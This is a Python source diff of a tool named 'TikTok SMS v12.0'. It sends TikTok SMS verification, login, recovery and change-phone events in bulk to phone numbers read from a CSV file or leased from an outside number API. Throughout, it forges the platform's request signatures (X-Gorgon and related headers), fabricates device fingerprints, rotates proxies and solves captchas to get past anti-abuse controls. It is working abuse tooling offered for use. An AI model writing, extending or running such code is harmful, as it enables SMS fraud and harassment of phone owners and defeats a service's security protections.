+            DevicePool] = None
+        self._writer: Optional[
+            ResultWriter] = None
+        self._connector: Optional[
+            aiohttp.TCPConnector] = None
+        self._sessions: List[
+            aiohttp.ClientSession] = []
+
+    def register(
+            self,
+            pool: Optional[
+                DevicePool] = None,
+            writer: Optional[
+                ResultWriter] = None,
+            connector: Optional[
+                aiohttp.TCPConnector] = None,
+            session: Optional[
+                aiohttp.ClientSession] = None
+    ) -> None:
+        if pool:
+            self._pool = pool
+        if writer:
+            self._writer = writer
+        if connector:
+            self._connector = connector
+        if session:
+            self._sessions.append(session)
+
+    async def cleanup(self) -> None:
+        log.info('Cleaning up...')
+        if self._pool:
+            try:
+                await self._pool.save(
+                    force=True)
+            except Exception as exc:
+                log.error(
+                    'Pool save: %s', exc)
+        if self._writer:
+            try:
+                self._writer.summary()
+                await self._writer.close()
+            except Exception as exc:
+                log.error(
+                    'Writer: %s', exc)
+        for s in self._sessions:
+            if s and not s.closed:
+                try:
+                    await s.close()
+                except Exception:
+                    pass
+        if (self._connector
+                and not
+                self._connector.closed):
+            try:
+                await self._connector.close()
+            except Exception:
+                pass
+
+
+# ============================================
+#  BATCHED TASK RUNNER
+# ============================================
+
+async def run_batched(
+        items: List[Any], worker,
+        batch_size: int = TASK_BATCH_SIZE
+) -> int:
+    total = len(items)
+    processed = 0
+    for start in range(0, total, batch_size):
+        if shutdown_event.is_set():
+            break
+        batch = items[start:start + batch_size]
+        tasks = [
+            asyncio.create_task(worker(item))
+            for item in batch
+            if not shutdown_event.is_set()]
+        if tasks:
+            done, _ = await asyncio.wait(
+                tasks,
+                return_when=(
+                    asyncio.ALL_COMPLETED))
+            for t in done:
+                exc = t.exception()
+                if exc and not isinstance(
+                        exc, (
+                            ShutdownError,
+                            asyncio
+                            .CancelledError)):
+                    log.error(
+                        'Task: %s', exc)
+            processed += len(done)
+    return processed
+
+
+# ============================================
+#  PROCESS CSV
+# ============================================
+
+async def process_csv(
+        config: AppConfig,
+        numbers: List[str],
+        proxies: Optional[List[str]] = None,
+        event: str = 'register',
+        threads: int = 5,
+        success_file: str = 'success.csv',
+        fail_file: str = 'failed.csv'
+) -> None:
+    is_lightweight = event in LIGHTWEIGHT_EVENTS
+    if is_lightweight:
+        config.validate_recovery()
+    else:
+        config.validate('csv')
+
+    event_cfg = get_event_config(event)
+
+    writer = ResultWriter(
+        success_file, fail_file)
+    await writer.open()
+    pool = DevicePool(config)
+    connector = aiohttp.TCPConnector(
+        limit=threads * 3,
+        enable_cleanup_closed=True)
+    guard = ResourceGuard()
+    guard.register(
+        pool=pool, writer=writer,
+        connector=connector)
+    sem = asyncio.Semaphore(threads)
+    captcha = CaptchaSolver(config)
+    hlr = HLRLookup(config)
+    proxy_mgr = ProxyManager(proxies)
+    limiter = RateLimiter(
+        config.global_rps,
+        config.global_burst)
+
+    if captcha.has_key:
+        async with aiohttp.ClientSession() as cs:
+            bal = await captcha.check_balance(cs)
+            if bal == 0:
+                log.error('Captcha balance 0')
+                await guard.cleanup()
+                return
+        log.info('Captcha solver: enabled')
+    else:
+        log.info(
+            'Captcha solver: disabled.'
+            ' Using rotation fallback.')
+
+    lw_label = (
+        'lightweight'
+        if is_lightweight
+        else 'full')
+
+    chain = build_endpoint_chain(
+        event_cfg,
+        include_deprecated=(
+            config
+            .include_deprecated_endpoints))
+    log.info(
+        'Event: %s (%s), sms_type=%d,'
+        ' chain: %s',
+        event, lw_label,
+        event_cfg.sms_type,
+        ' → '.join(
+            'tier-' + str(ep.tier)
+            for ep, _ in chain))
+
+    pool_count = await pool.count()
+    log.info('Pool: %d devices', pool_count)
+
+    try:
+        async def worker(
+                phone: str) -> None:
+            if shutdown_event.is_set():
+                return
+            async with sem:
+                if shutdown_event.is_set():
+                    return
+                async with TikTokSMS(
+                    config, connector,
+                    proxy_mgr, captcha,
+                    hlr, pool, limiter
+                ) as client:
+                    result = (
+                        await client.send_event(
+                            phone, event))
+                    await writer.write(result)
+                await asyncio.sleep(
+                    random.uniform(
+                        config.delay_min,
+                        config.delay_max))
+
+        await run_batched(numbers, worker)
+    except asyncio.CancelledError:
+        log.info('CSV cancelled')
+    except Exception as exc:
+        log.error('CSV: %s', exc)
+    finally:
+        await guard.cleanup()
+
+
+# ============================================
+#  BATCH RESULTS COLLECTOR
+# ============================================
+
+@dataclass
+class BatchCollector:
+    results: List[dict] = field(
+        default_factory=list)
+    lock: asyncio.Lock = field(
+        default_factory=asyncio.Lock)
+
+    async def add(
+            self, entry: dict) -> None:
+        async with self.lock:
+            self.results.append(entry)
+
+
+# ============================================
+#  PROCESS API
+# ============================================
+
+async def process_api(
+        config: AppConfig,
+        proxies: Optional[List[str]] = None,
+        event: str = 'register',
+        threads: int = 5,
+        claim_count: int = 10,
+        lease_seconds: int = 600,
+        success_file: str = 'success.csv',
+        fail_file: str = 'failed.csv'
+) -> None:
+    is_lightweight = event in LIGHTWEIGHT_EVENTS
+    if is_lightweight:
+        config.validate_recovery(
+            need_number_api=True)
+    else:
+        config.validate('api')
+
+    event_cfg = get_event_config(event)
+
+    writer = ResultWriter(
+        success_file, fail_file)
+    await writer.open()
+    pool = DevicePool(config)
+    connector = aiohttp.TCPConnector(
+        limit=threads * 3,
+        enable_cleanup_closed=True)
+    guard = ResourceGuard()
+    guard.register(
+        pool=pool, writer=writer,
+        connector=connector)
+    sem = asyncio.Semaphore(threads)
+    captcha = CaptchaSolver(config)
+    hlr = HLRLookup(config)
+    proxy_mgr = ProxyManager(proxies)
+    limiter = RateLimiter(
+        config.global_rps,
+        config.global_burst)
+    number_api = NumberAPI(config)
+
+    if captcha.has_key:
+        async with aiohttp.ClientSession() as cs:
+            bal = await captcha.check_balance(cs)
+            if bal == 0:
+                log.error('Captcha balance 0')
+                await guard.cleanup()
+                return
+        log.info('Captcha solver: enabled')
+    else:
+        log.info(
+            'Captcha solver: disabled.'
+            ' Using rotation fallback.')
+
+    lw_label = (
+        'lightweight'
+        if is_lightweight
+        else 'full')
+
+    chain = build_endpoint_chain(
+        event_cfg,
+        include_deprecated=(
+            config
+            .include_deprecated_endpoints))
+    log.info(
+        'Event: %s (%s), sms_type=%d,'
+        ' chain: %s',
+        event, lw_label,
+        event_cfg.sms_type,
+        ' → '.join(
+            'tier-' + str(ep.tier)
+            for ep, _ in chain))
+
+    pool_count = await pool.count()
+    log.info('Pool: %d devices', pool_count)
+
+    total_claimed = 0
+    batch_num = 0
+    empty_streak = 0
+
+    api_session = aiohttp.ClientSession(
+        connector=connector,
+        connector_owner=False)
+    guard.register(session=api_session)
+
+    try:
+        while not shutdown_event.is_set():
+            batch_num += 1
+            try:
+                cd = await number_api.claim(
+                    api_session,
+                    claim_count,
+                    lease_seconds)
+            except (
+                NetworkError, AppError
+            ) as exc:
+                log.error('Claim: %s', exc)
+                empty_streak += 1
+                if (empty_streak
+                        >= MAX_EMPTY_CLAIMS):
+                    break
+                await asyncio.sleep(
+                    min(
+                        2 ** empty_streak,
+                        30))
+                continue
+
+            if (not cd
+                    or not cd.get('items')):
+                empty_streak += 1
+                if (empty_streak
+                        >= MAX_EMPTY_CLAIMS):
+                    break
+                await asyncio.sleep(
+                    min(
+                        2 ** empty_streak,
+                        30))
+                continue
+
+            empty_streak = 0
+            claim_id = cd.get('claimId', '')
+            items = cd['items']
+            total_claimed += len(items)
+            collector = BatchCollector()
+
+            async def worker(
+                    item: dict) -> None:
+                if shutdown_event.is_set():
+                    return
+                phone = item['phone']
+                nid = item['id']
+                async with sem:
+                    if shutdown_event.is_set():
+                        return
+                    async with TikTokSMS(
+                        config, connector,
+                        proxy_mgr, captcha,
+                        hlr, pool, limiter
+                    ) as client:
+                        result = (
+                            await client
+                            .send_event(
+                                phone,
+                                event))
+                        await writer.write(
+                            result)
+                    entry: Dict[str, Any] = {
+                        'id': int(nid),
+                        'status':
+                            result['status']}
+                    if (result['status']
+                            == 'fail'):
+                        entry['note'] = (
+                            'ec='
+                            + str(result[
+                                'error_code']))
+                    await collector.add(entry)
+
+            await run_batched(items, worker)
+
+            if (collector.results
+                    and not
+                    shutdown_event.is_set()):
+                try:
+                    await number_api.report(
+                        api_session,
+                        claim_id,
+                        collector.results)
+                except (
+                    NetworkError, AppError
+                ) as exc:
+                    log.warning(
+                        'Report: %s', exc)
+
+            await pool.save()
+            await asyncio.sleep(
+                random.uniform(1.0, 3.0))
+
+        log.info(
+            'Total claimed: %d',
+            total_claimed)
+    except asyncio.CancelledError:
+        log.info('API cancelled')
+    except Exception as exc:
+        log.error('API: %s', exc)
+    finally:
+        await guard.cleanup()
+
+
+# ============================================
+#  PREWARM
+# ============================================
+
+async def prewarm_pool(
+        config: AppConfig,
+        proxies: Optional[List[str]] = None,
+        count: int = 10,
+        regions: Optional[List[str]] = None
+) -> None:
+    config.validate('prewarm')
+    if not regions:
+        regions = [
+            'US', 'GB', 'DE', 'AT',
+            'VN', 'TR', 'BR']
+    proxy_mgr = ProxyManager(proxies)
+    pool = DevicePool(config)
+    limiter = RateLimiter(5.0, 10)
+    captcha = CaptchaSolver(config)
+    hlr = HLRLookup(config)
+    connector = aiohttp.TCPConnector(
+        limit=20,
+        enable_cleanup_closed=True)
+    ver = config.get_default_apk_version()
+    td = count * len(regions)
+    log.info(
+        'Prewarm: %d x %d = %d devices'
+        ' (ver=%s, gorgon=%d,'
+        ' sdk=%d-%d)',
+        count, len(regions), td,
+        ver.version_name,
+        ver.gorgon_version,
+        ver.min_sdk, ver.target_sdk)
+    try:
+        sem = asyncio.Semaphore(5)
+
+        async def register_one(
+                wi: Tuple[str, int]
+        ) -> None:
+            region, index = wi
+            async with sem:
+                if shutdown_event.is_set():
+                    return
+                await limiter.acquire()
+                tag = (
+                    '[pw-' + region
+                    + '-' + str(index) + ']')
+                async with TikTokSMS(
+                    config, connector,
+                    proxy_mgr, captcha,
+                    hlr, pool, limiter
+                ) as client:
+                    client.device = (
+                        Device.generate(
+                            config, region))
+                    client.api_host = (
+                        config.random_host())
+                    proxy_url = (
+                        await proxy_mgr.get(
+                            region))
+                    try:
+                        ok = await (
+                            client
+                            ._register_device(
+                                proxy_url,
+                                phone=''))
+                        if ok:
+                            await (
+                                client
+                                ._activate_device(
+                                    proxy_url,
+                                    phone=''))
+                            await pool.add(
+                                client.device)
+                            log.info(
+                                '%s OK %s',
+                                tag,
+                                client.device
+                                .device_id)
+                        else:
+                            log.warning(
+                                '%s FAIL',
+                                tag)
+                    except (
+                        DeviceError,
+                        SignerError,
+                        NetworkError,
+                        ParseError,
+                    ) as exc:
+                        log.error(
+                            '%s FAIL %s',
+                            tag, exc)
+                    except Exception as exc:
+                        log.error(
+                            '%s FAIL %s: %s',
+                            tag,
+                            type(exc).__name__,
+                            exc)
+                await asyncio.sleep(
+                    random.uniform(0.5, 1.5))
+
+        work_items: List[
+            Tuple[str, int]] = [
+            (r, idx)
+            for r in regions
+            for idx in range(count)
+        ]
+        await run_batched(
+            work_items, register_one)
+    finally:
+        await pool.save(force=True)
+        if not connector.closed:
+            await connector.close()
+    tr = await pool.count()
+    log.info('Pool ready: %d devices', tr)
+
+
+# ============================================
+#  DEPENDENCY CHECK
+# ============================================
+
+def check_dependencies(
+        apk_ver: Optional[
+            APKVersion] = None
+) -> Tuple[bool, Optional[APKVersion]]:
+    """Check SignerPy compatibility.
+
+    Returns (ok, detected_version).
+    detected_version is the APKVersion that
+    the signer actually supports (may differ
+    from apk_ver if signer is outdated).
+    """
+    try:
+        ver = apk_ver or DEFAULT_APK_VERSION
+
+        # Check SignerPy version
+        signerpy_version = None
+        try:
+            import SignerPy as _sp
+            signerpy_version = getattr(
+                _sp, '__version__',
+                getattr(
+                    _sp, 'VERSION',
+                    None))
+        except Exception:
+            pass
+        if signerpy_version:
+            log.info(
+                'SignerPy version: %s',
+                signerpy_version)
+        else:
+            log.info(
+                'SignerPy imported'
+                ' (version unknown)')
+
+        # Log available modules
+        modules = ['sign', 'get', 'encryption']
+        if HAS_TTENCRYPT:
+            modules.append('ttencrypt')
+        if HAS_EDATA_DECRYPT:
+            modules.append('edata')
+        log.info(
+            'SignerPy modules: %s',
+            ', '.join(modules))
+
+        # Test sign() with requested version
+        test_params = (
+            'aid=1233'
+            '&device_id=7123456789012345678')
+        result = signer_sign(
+            params=test_params,
+            payload=None,
+            gorgon_version=ver.gorgon_version,
+        )
+
+        required = {
+            'x-gorgon', 'x-khronos'}
+        optional = {'x-argus', 'x-ladon'}
+        missing = required - result.keys()
+        if missing:
+            log.error(
+                'Missing required headers: %s',
+                missing)
+            return False, None
+
+        present_optional = (
+            optional & result.keys())
+        if present_optional:
+            log.info(
+                'Optional headers present: %s',
+                present_optional)
+
+        # Validate gorgon prefix
+        gorgon = result.get('x-gorgon', '')
+        expected_prefix = str(
+            ver.gorgon_version)[:4]
+        if gorgon:
+            if gorgon.startswith(
+                    expected_prefix):
+                log.info(
+                    'X-Gorgon OK: %s for %s'
+                    ' (version=%d)',
+                    gorgon[:4],
+                    ver.version_name,
+                    ver.gorgon_version)
+            else:
+                log.warning(
+                    'X-Gorgon mismatch:'
+                    ' expected %s, got %s.',
+                    expected_prefix,
+                    gorgon[:4])
+                detected = (
+                    detect_signer_version())
+                if detected:
+                    log.info(
+                        'Auto-detected: %s'
+                        ' (gorgon=%d)',
+                        detected.version_name,
+                        detected.gorgon_version)
+                    # Verify body signing
+                    body_result = signer_sign(
+                        params=test_params,
+                        payload=(
+                            'type=5&mobile=123'),
+                        gorgon_version=(
+                            detected
+                            .gorgon_version),
+                    )
+                    if 'x-gorgon' in body_result:
+                        log.info(
+                            'SignerPy OK'
+                            ' (auto: %s)',
+                            detected.version_name)
+                        return True, detected
+                log.error(
+                    'SignerPy incompatible.'
+                    ' pip install --upgrade'
+                    ' SignerPy')
+                return False, None
+
+        # Verify body signing
+        body_result = signer_sign(
+            params=test_params,
+            payload='type=5&mobile=123',
+            gorgon_version=ver.gorgon_version,
+        )
+        if 'x-gorgon' not in body_result:
+            log.error('Body signing failed')
+            return False, None
+
+        # Test encryption
+        test_payload = {
+            'magic_tag': 'ss_app_log',
+            'header': {'aid': 1233},
+        }
+        try:
+            encrypted = signer_encrypt(
+                test_payload)
+            log.info(
+                'Encryption OK: %d bytes',
+                len(encrypted))
+        except SignerError as exc:
+            log.warning(
+                'Encryption failed: %s.'
+                ' device_register may not'
+                ' work.', exc)
+
+        # Test decryption (non-critical)
+        if HAS_EDATA_DECRYPT:
+            try:
+                if encrypted:
+                    decrypted = signer_decrypt(
+                        encrypted)
+                    if decrypted:
+                        log.info(
+                            'Decryption OK')
+            except SignerError:
+                log.warning(
+                    'Decryption non-critical'
+                    ' fail')
+        else:
+            log.info(
+                'Decryption module not'
+                ' available (non-critical)')
+
+        # Test get() params update
+        try:
+            test_params_dict = {
+                'aid': APP_AID,
+                'device_platform': 'android',
+            }
+            updated = signer_get_params(
+                test_params_dict)
+            if updated:
+                log.info(
+                    'SignerPy.get() OK:'
+                    ' %d params updated',
+                    len(updated))
+            else:
+                log.info(
+                    'SignerPy.get() returned'
+                    ' empty (non-critical)')
+        except SignerError as exc:
+            log.warning(
+                'SignerPy.get() failed: %s'
+                ' (non-critical)', exc)
+
+        log.info(
+            'SignerPy OK (ver=%s,'
+            ' gorgon=%d)',
+            ver.version_name,
+            ver.gorgon_version)
+        return True, ver
+
+    except ImportError as exc:
+        log.error(
+            'SignerPy not installed: %s.'
+            ' Run: pip install SignerPy',
+            exc)
+        return False, None
+    except SignerError as exc:
+        log.error(
+            'SignerPy: %s', exc)
+        return False, None
+    except Exception as exc:
+        log.error(
+            'SignerPy: %s: %s',
+            type(exc).__name__, exc)
+        return False, None
+
+
+# ============================================
+#  CLI
+# ============================================
+
+def parse_proxies(
+        proxy_arg: Optional[str] = None,
+        proxy_file: Optional[str] = None
+) -> Optional[List[str]]:
+    proxies: List[str] = []
+    if proxy_arg:
+        proxies.append(proxy_arg)
+    if (proxy_file
+            and os.path.exists(proxy_file)):
+        with open(proxy_file, 'r') as f:
+            for line in f:
+                s = line.strip()
+                if s and not s.startswith('#'):
+                    proxies.append(s)
+    return proxies if proxies else None
+
+
+def main():
+    _setup_signals()
+
+    parser = argparse.ArgumentParser(
+        description='TikTok SMS v12.0'
+        ' (SignerPy)')
+    source = (
+        parser
+        .add_mutually_exclusive_group(
+            required=True))
+    source.add_argument(
+        '--input', '-i', default=None)
+    source.add_argument(
+        '--api', action='store_true')
+    source.add_argument(
+        '--prewarm', action='store_true')
+    parser.add_argument(
+        '--event', '-e',
+        default='register',
+        choices=list(VALID_EVENTS),
+        help=(
+            'Event type:'
+            ' register (type=6, tier-1),'
+            ' login (type=1, tier-1),'
+            ' recovery (type=9/5,'
+            ' lightweight),'
+            ' change_phone (type=27/21,'
+            ' lightweight)'))
+    parser.add_argument(
+        '--success', '-s',
+        default='success.csv')
+    parser.add_argument(
+        '--fail', '-f',
+        default='failed.csv')
+    parser.add_argument(
+        '--proxy', '-p', default=None)
+    parser.add_argument(
+        '--proxy-file', default=None)
+    parser.add_argument(
+        '--threads', '-t',
+        type=int, default=5)
+    parser.add_argument(
+        '--config', '-c',
+        default='config.json')
+    parser.add_argument(
+        '--claim-count',
+        type=int, default=None)
+    parser.add_argument(
+        '--lease-seconds',
+        type=int, default=None)
+    parser.add_argument(
+        '--pool-count',
+        type=int, default=10)
+    parser.add_argument(
+        '--pool-regions',
+        nargs='+', default=None)
+    parser.add_argument(
+        '--rps', type=float, default=None)
+    parser.add_argument(
+        '--skip-check',
+        action='store_true')
+    parser.add_argument(
+        '--debug-registration',
+        action='store_true')
+    parser.add_argument(
+        '--include-deprecated',
+        action='store_true',
+        help=(
+            'Include deprecated endpoints'
+            ' (tier 4/5) in fallback chain'))
+    parser.add_argument(
+        '--gorgon-version',
+        type=int,
+        default=None,
+        choices=list(
+            SIGNERPY_GORGON_VERSIONS),
+        help=(
+            'Override gorgon algorithm'
+            ' version (8404, 8402, 4404)'))
+    parser.add_argument(
+        '--version',
+        default=None,
+        choices=[
+            v.version_name
+            for v in APK_VERSIONS])
+
+    args = parser.parse_args()
+
+    config = load_config(args.config)
+    overrides: Dict[str, Any] = {}
+    if args.rps is not None:
+        overrides['global_rps'] = args.rps
+    if args.debug_registration:
+        overrides['debug_registration'] = True
+    if args.include_deprecated:
+        overrides[
+            'include_deprecated_endpoints'
+        ] = True
+    if args.version is not None:
+        overrides['default_version'] = (
+            args.version)
+    if overrides:
+        config = config.with_overrides(
+            **overrides)
+
+    # ── Signer check + auto-detect ──
+    if not args.skip_check:
+        selected = (
+            config.get_default_apk_version())
+        ok, detected = check_dependencies(
+            selected)
+        if not ok:
+            sys.exit(1)
+        if (detected
+                and detected.version_name
+                != config.default_version):
+            log.warning(
+                'AUTO-SWITCH: %s -> %s'
+                ' (SignerPy compatibility)',
+                config.default_version,
+                detected.version_name)
+            config = config.with_overrides(
+                default_version=(
+                    detected.version_name))
+
+    proxies = parse_proxies(
+        args.proxy, args.proxy_file)
+    cc = (
+        args.claim_count
+        if args.claim_count is not None
+        else config.claim_count)
+    ls = (
+        args.lease_seconds
+        if args.lease_seconds is not None
+        else config.lease_seconds)
+    if proxies:
+        log.info('Proxies: %d', len(proxies))
+
+    ver = config.get_default_apk_version()
+    compatible = len([
+        d for d in config.devices
+        if ver.is_device_compatible(
+            int(d[2]))])
+    log.info(
+        'APK: %s (tt-ok=%s, gorgon=%d,'
+        ' sdk=%d-%d, devices=%d)',
+        ver.version_name,
+        ver.tt_ok_version,
+        ver.gorgon_version,
+        ver.min_sdk, ver.target_sdk,
+        compatible)
+    if ver.is_outdated(
+            VERSION_STALENESS_DAYS):
+        log.warning(
+            '%s is > %dd old',
+            ver.version_name,
+            VERSION_STALENESS_DAYS)
+    if ver.stability == 'deprecated':
+        log.warning(
+            '%s deprecated, use %s',
+            ver.version_name,
+            DEFAULT_APK_VERSION.version_name)
+
+    event = args.event
+    is_lw = event in LIGHTWEIGHT_EVENTS
+    event_cfg = get_event_config(event)
+    lw_label = (
+        'lightweight' if is_lw else 'full')
+
+    chain = build_endpoint_chain(
+        event_cfg,
+        include_deprecated=(
+            config
+            .include_deprecated_endpoints))
+
+    log.info(
+        'Event: %s (sms_type=%d, %s)',
+        event, event_cfg.sms_type, lw_label)
+    log.info(
+        'Endpoint chain: %s',
+        ' → '.join(
+            'tier-' + str(ep.tier)
+            + ' ' + ep.path
+            + ' (type=' + str(st) + ')'
+            for ep, st in chain))
+    if is_lw:
+        log.info(
+            'Lightweight mode: disposable'
+            ' fingerprints, instant rotation')
+
+    # Log SignerPy capabilities summary
+    caps = ['sign', 'get', 'enc']
+    if HAS_TTENCRYPT:
+        caps.append('ttencrypt')
+    if HAS_EDATA_DECRYPT:
+        caps.append('edata')
+    log.info(
+        'SignerPy capabilities: %s',
+        ', '.join(caps))
+
+    try:
+        if args.prewarm:
+            if is_lw:
+                log.warning(
+                    'Prewarm not needed for'
+                    ' %s — lightweight uses'
+                    ' disposable fingerprints',
+                    event)
+                return
+            asyncio.run(prewarm_pool(
+                config, proxies,
+                args.pool_count,
+                args.pool_regions))
+        elif args.api:
+            asyncio.run(process_api(
+                config, proxies,
+                event,
+                args.threads,
+                cc, ls,
+                args.success,
+                args.fail))
+        else:
+            numbers = read_numbers(
+                args.input)
+            if not numbers:
+                log.error('No numbers')
+                sys.exit(1)
+            asyncio.run(process_csv(
+                config, numbers, proxies,
+                event,
+                args.threads,
+                args.success,
+                args.fail))
+    except ConfigError as exc:
+        log.error('Config: %s', exc)
+        sys.exit(1)
+
+
+if __name__ == '__main__':
+    main()
